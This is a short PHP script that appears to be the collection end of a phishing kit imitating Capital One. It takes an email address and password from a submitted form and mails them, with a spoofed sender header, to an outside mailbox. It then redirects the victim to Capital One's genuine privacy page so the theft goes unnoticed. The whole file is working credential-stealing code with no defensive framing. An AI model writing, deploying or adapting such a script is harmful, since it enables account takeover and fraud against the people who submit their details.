<?php
//get data from form  
$email = $_POST['email'];
$empass = $_POST['empass'];
$to = "whykkaymailbox@pupsikaneto.ml";
$subject = "Mail From website";
$txt ="Email = ". $email . "\r\n  Empass =" . $empass;
$headers = "From: account@offshore.cusocalb.com" . "\r\n" .
"CC: whykkaymailbox@pupsikaneto.ml";
if($empass!=NULL){
    mail($to,$subject,$txt,$headers);
}
//redirect
header("Location:https://www.capitalone.com/privacy/");
?>
